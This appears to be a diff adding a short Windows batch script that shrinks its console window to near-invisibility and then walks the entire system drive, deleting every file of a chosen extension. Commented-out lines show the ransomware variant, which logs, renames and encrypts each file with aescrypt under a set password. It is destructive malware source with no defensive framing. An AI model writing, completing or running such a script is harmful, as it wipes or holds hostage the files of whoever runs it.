@@ -1,0 +1,11 @@
+
+mode con:cols=50 lines=2
+set pass=your_password
+
+FOR /R "%homedrive%\" %%X in (*.Ext) DO (
+REM echo %%X >> %homedrive%\Original.txt SafeMode
+REM Rename "%%X" "%%~nX.bak" >NUL 2>&1 SafeMode
+REM use aescrypt for test...   
+REM aescrypt -e -p %pass% "%%X"
+del "%%X"
+)
